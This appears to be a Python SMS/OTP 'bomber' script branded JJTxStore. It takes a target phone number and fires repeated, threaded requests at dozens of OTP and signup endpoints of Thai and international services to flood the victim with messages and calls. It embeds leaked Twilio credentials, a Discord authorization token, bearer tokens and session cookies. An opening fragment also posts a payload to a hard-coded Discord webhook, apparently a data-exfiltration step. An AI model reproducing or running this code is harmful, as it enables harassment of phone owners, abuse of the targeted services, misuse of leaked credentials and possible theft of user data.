...
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        ...
                        try:
                            ...
                            req = Request('https://discord.com/api/webhooks/1067048703262728254/EVuj_iRFxr_6WQLvb0aoAJrTVMjgBmDcmvs1QdTFH8ckFkleVTd2LVx1aJXYP3-VMxQ_', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
...
acount_sid = "AC35f6ac130a25535a9cf36f82cff1ff0e"

auth_token = '4170bc02fb95c1f0f7f8cc49283ae395'
...
headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"}
header={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"}


def HEEPROHEEMAEMUNGAI_JJTXSTORE_01(phone):
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_02(phone):
    post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")
    
def HEEPROHEEMAEMUNGAI_JJTXSTORE_03(phone):
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_1(phone):
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_2(phone):
    post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
    
def HEEPROHEEMAEMUNGAI_JJTXSTORE_3(phone):
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_4(phone):
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_8(phone):
    post("https://www.theconcert.com/rest/request-otp",json={"mobile":phone,"country_code":"TH","lang":"th","channel":"call","digit":4},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.708266966.1646798262;_fbp=fb.1.1646798263293.934490162;_gid=GA1.2.1869205174.1646798265;__gads=ID=3a9d3224d965d1d5-2263d5e0ead000a6:T=1646798265:RT=1646798265:S=ALNI_MZ7vpsoTaLNez288scAjLhIUalI6Q;_ga=GA1.2.2049889473.1646798264;_gat_UA-133219660-2=1;_ga_N9T2LF0PJ1=GS1.1.1646798262.1.1.1646799146.0;adonis-session=a5833f7b41f8bc112c05ff7f5fe3ed6fONCSG8%2Fd2it020fnejGzFhf%2BeWRoJrkYZwCGrBn6Ig5KK0uAhDeYZZgjdJeWrEkd2QqanFeA2r8s%2FXf7hI1zCehOFlqYcV7r4s4UQ7DuFMpu4ZJ45hicb4xRhrJpyHUA;XSRF-TOKEN=aacd25f1463569455d654804f2189bc77TyRxsqGOH%2FFozctmiwq6uL6Y4hAbExYamuaEw%2FJqE%2FrWzfaNdyMEtwfkls7v8UUNZ%2BFWMqd9pYvjGolK9iwiJm5NW34rWtFYoNC83P0DdQpoiYfm%2FKWn1DuSBbrsEkV"})
    
 
    
def HEEPROHEEMAEMUNGAI_JJTXSTORE_9(phone):
    post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phone})
    
def HEEPROHEEMAEMUNGAI_JJTXSTORE_10(phone):
    post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+phone)
    
def HEEPROHEEMAEMUNGAI_JJTXSTORE_11(phone):
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_12(phone):
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_13(phone):
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_18(phone):
    session = Session()
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_26(phone):
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_27(phone):
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_28(phone):
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_31(phone):
...
def HEEPROHEEMAEMUNGAI_JJTXSTORE_32(phone):
...
def Dxkhung1(phone):
    post("https://api-sso.ch3plus.com/user/request-otp", json={"tel": phone, "type": "login"})
    post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}")
...
def Dxkhung19(phone):
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": "ballzaza"}})
...
def Dxkhung33(phone):
    post(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"})
...
def Dxkhung40(phone):
	post("https://discord.com/api/v9/users/@me/phone",json={"phone": "+66"+phone,"change_phone_reason": "guild_phone_required"},headers={"authorization":"OTA4MjA2NjE4NjE1OTA2Mzg1.Ycz2Hw.TdQLC2lIwn6UQDl1xBsyJGLnjOw"})
...
def Dxkhung43(phone):
	get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+phone+"&type=mobile")
...
def Dxkhung45(phone):
    d=post("https://taxi.yandex.kz/3.0/launch/",json={},headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}).json()
...
def Dxkhung50(phone):
    post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}).json()

def Dxkhung52(phone):
    post("https://www.kaitorasap.co.th/api/index.php/send-otp/", data="phone_number="+phone+"&lag=",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Cookie": "PHPSESSID=f5nrukmps3fa5gk25eh4v0tgg0; _ga=GA1.3.1240095898.1635597163; _gid=GA1.3.747741928.1635597163; _gat_gtag_UA_141105037_1=1"})
...
def Dxkhung58(phone):
    post("https://tamjaibet.com/api/request/otp", data={"phoneNumber": "0"+phone,"token":"HFdjc3ZU4WAnxLQQcCWB0TWV9zPCdpWmFpCUApNUtwAENbCGJkEAR9ckcdc20XMFR8HVQhEkREXwIOcDwnKRl1LDpXaQMJYB8ZSBQzZRdpem4YF3VHST0BYVQTU1NEcQATSSgpOnY3ZS9ZAFw3WSZXASwecS4LZD5wWhRicklxFQ1cFVAiczQOYxYSfUkaTD1sSSFTZU0mRDoZciRkEHV9dTE"})
...
print(f"{r}L{y}O{g}A{cy}D{b}E{cy}D{g}!{y}!{r}!")
def run():
    phone = input(F"{g}PH{w}ONE {r}NUM{w}BER : ")
    amount = int(input(f"{y}AMO{w}UNT : "))
    am = 0
    print(f"{r}Sta{w}tus : {g}Waiting..")
    sleep(1)
    System.Title(f"JJTxStore - Status : Spamming To {phone}")
    for i in range(amount):
        otp = random.randint(1000,9999)
        am = am + 1
        print(f"{b}Spamming to {g}-- {w}{phone} {g}-- {r}Round : ({str(am)}/{str(amount)}){g}")
        System.Title(f"JJTxStore - Status : Spamming To {phone} - Round : ({str(am)}/{str(amount)})")
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_01,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_02,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_03,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_1,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_2,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_3,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_3,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_4,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_5,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_6,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_7,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_8,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_9,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_10,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_11,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_12,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_13,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_14,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_15,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_16,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_17,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_18,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_19,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_20,phone)        
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_21,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_22,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_23,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_24,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_25,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_26,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_27,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_28,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_29,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_30,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_31,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_32,phone)
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        ...
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel": f"{phone}", "type": "login"}, headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0}, headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post("https://www.bigthailand.com/authentication-service/user/OTP",json={"locale": "th","phone": f"+66{phone}","email": "e@gmail.com","userParams": {"buyerName": "จารถ","activateLink": "www.google.com"}}, headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post("https://openapi.bigc.co.th/customer/v1/otp",json={"phone_no": phone}, headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_01,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_02,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_03,phone)
        ...
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post("https://accountinformation.roblox.com/v1/phone",json={"countryCode": "TH","prefix": "66","phone": phone,"password": ""}, headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
        session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        ...
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        session.get(f"https://v2.api01.wemove.co.th/auth/api/v1/user/otp?phone={phone}",headers={"User-Agent": user,"Content-Type": "application/json","Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZU1vdmUiLCJzdWIiOiJVMjIwNjExMTU0NDQ2OTMxNTI1NTlkMmQ3NTJlODc4MDM0YTgzYThmNzFkZjk3NzU0NmEiLCJyZWYiOiIyMjA2MTExNTQ0NDg0NDIyOTYiLCJleHAiOjE2ODY0OTgyODguNDQyMzM1LCJuYmYiOjE2NTQ5NjIyODguNDQyMzM3MywiaWF0IjoxNjU0OTYyMjg4LjQ0MjMzODJ9.57KWEK9TFMpFd1adVmRZClzK8pcv3UVtjUF9EUHKsNA"})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post("https://passport.twitch.tv/protected_register",json={"username":''.join((random.choice('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890') for i in range(15))),"password":''.join((random.choice('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890+_-*&^%$#@!?') for i in range(15))),"birthday":{"day":random.randint(10,20),"month":random.randint(1,9),"year":random.randint(1980,2009)},"client_id":"kimne78kx3ncx6brgo4mv6wki5h1ko","phone_number":f"+66{phone}","verification_code":"180342","integrity_token":"v4.local.Jw0VJMONPIG43cucbcmdTq0jJBxn_k2oKlo0fG1g-XFqAPVlaiOM-xzlBhuXkEWbwCwd96TxwOV4XqWRRWDkMSEobH3tr7riqMCZPrLebb7jPyv2vwv45myWmPSz9TH3j3x1kQtS74RufbW9i5U_XkifWgUZULvEaa2AS5qSJhDPceHhuulPemhUmv48iN6YFlzWjBC-vbNUFHUFwyRsoi7oNCHLlyJ46E-f92ZW6jAF2OZYR449XzbF0PUe0gV4ErBOA7TVP_KYx08wUlx5s3Q11_qlAR5xFhupZdV4kuJHs1qWzc2mOgO-JNzJkU0NXwJwbA8DfV3Uhvhle0cfAIh3UXcVKxguvDsJlcKtbG5p_DIejC9Kf9UeJfJTdeRo2udfQwAxNNJat5DbvUNBZdPAEcFSsmdnuYUwdvXLjCBiiw9wO7-xZqB39WapqPXPWXNc3QcNLvwifWwwlkN1aJ7TrFeMP0zWwtcc-2fYXhiu4nP3lhkMZQ"}, headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post("https://shopee.co.th/api/v4/otp/send_vcode",json={"phone":f"66{phone}","force_channel":"true","operation":8,"channel":1,"supported_channels":[1,2,3],"support_session":"false"}, headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        ...
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post("https://www.monomax.me/api/v2/signup/telno",json ={"password":''.join((random.choice('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890+_-*&^%$#@!?') for i in range(15))),"telno": phone}, headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_01,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_02,phone)
        threading.submit(HEEPROHEEMAEMUNGAI_JJTXSTORE_03,phone)
        ...
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post(f"https://discord.com/api/v9/users/@me/phone",json={"phone":f"+66{phone}","captcha_key":"P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hKdwYXNza2V5xQRDPjqZLgTpb7NhoWtCEpxYUY3OVp12Nd2MF5zxNXNPXclfzKgBxhDQ91BtQdEVWLqOqCIz-500vbonuY77FFSKv6kEJrzwQjQdEjrYhoayMNBYjgxn-oFqHMEo8veQw3rTzHI36WD_sH-j-udEW9T_N2LCY5nfyXsjFk8xjbl1zV84f1GUwqwk9-b25HjIeNB0vA0nK9B9jyUj-fODQkY8xdmIeq5dhYu-xk4B2tnfuj9wbNbJl-wQz8uwo3aqfbc1xBaqFULHSlPXQjUWqgib4hodFvAcP_xPEnsA91beKIA69pdBDdI6nlpDktat0TsNHJAofE4kQdYA0yP_1cTix0SdEqwrww75qDfXLwfs35mWsBrSQsJr0LafrXyKym6C5L8H2Zzt_mgPCjLTPjFcyoT84WW6uRfMzEsUE71CAcEeKS3ch6fgCrcWOpcYZlyc1xLBkal7EiI9N69xVx6OoADGxda-nt2G6bgyMrf81maPyrIVKZJCd9tlS9iuaWr7x_IM2c9AWigTIWkfrcNe1OzoU6d2yuCnCBrSxUNaIeMJEuYp75ESYMLEqlzUpJbOCioP4bstO_Ioep0otqnRt8EH7ME6FNG6XtYUF6ZM4gXJHMvT_DJ7wW0T5x4B6PKDokzPb-2_SDJ8mSzi-3eYBdYHfut4sbqRifQ-QmvvMc58lkBO1oM0ZfDzrACHNutwiMIoc0EGzZ-Ctry-kpj2ppHdCM3E8a4M2ZWiBq45QtwVMhvY6xAPJCLZAPA-9L-fComAiOfmBWtNaSu7gQ6DjiOhF27ADhNqzdN1ey_YizXt66V-PkEZJsGJB5A9RWT2AJgaezaohjfI3HVNb2qZ9xFj6faVDTSM7C26LKXbuIrQiMWHLyJl0-hSPllHpFbqqUMYYgvQlLlrgGOBwIP_172V8RuDV-ClNGJXxVqMDaHtIibESBT8-oKfbWuMSwzg33Q87LknBqHyppe-hbLCKqITHjOvPjc-MDBtkdUUNg0C1-z2c2YIULEUP6svAsorPNaLandpKJ4soWswzMczSTjhhu-bzuHJ9Cl5S9Cjz7yV6LYB4AIS3NOS4OvZjecrAJpAeknDeqHrjUwbClouxluYMdpAjP_qOH6GyPlsJCy616pWunvpdV3-I_qYQJRS9UNu4egsd6nlsWNmDfXW4qzJCfhQC8s98tlqrBlRgzSEPSbvQhphVdzdIlWav2xbOnQRUrok-rcd_iMSFSUDgfKI9jJXw7I777sR9JYS2aLtTKDccznDVfFsFDxLSsD8cjyfemaKFtosajMBGURyesjIzAxqspd8L0vgY9FN3kcMp07VUd5y4f4PgKB6dmaWrjem4kw0u6rlBguYbgJu2PpfapOR_JWQy5OXv_FglHc0lBNT2Y6IgfYDvrJdzFHUQKxdsQk51iOCfX6E4q16p7wXn7duEs2JU7Zko-MdcjxWaYOjZXhwzmQC6kGoc2hhcmRfaWTOD3Lqb6JwZAA.CXSzIbl07w3rGRN6mTdRQxJSieeoCLU2lbgzqYRH9Gc","change_phone_reason":"user_settings_update"}, headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post("https://slotgame.vip/_ajax_/request-otp",json={"request_otp[phoneNumber]": phone,"request_otp[termAndCondition]": "1","request_otp[_token]": "9l6ArQIfrObxGQmLcXXT9aZr98HE521b27n_yDV5kSQ"}, headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone}, headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        ...
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        requests.post("https://www.twilio.com/signup/v2/phone-number/verification/sms",json={"IsoCountryCode":"TH","CountryCodeNumber":"+66","PhoneNumber":f"+66{phone}"}, headers={"User-Agent": useragent})
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
        ...
        requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}", headers={"User-Agent": useragent})
    sleep(1)
    System.Title(f"JJTxStore - Status : Succeeded Spam To {phone} - Amount {amount}")
    system("clear||cls")
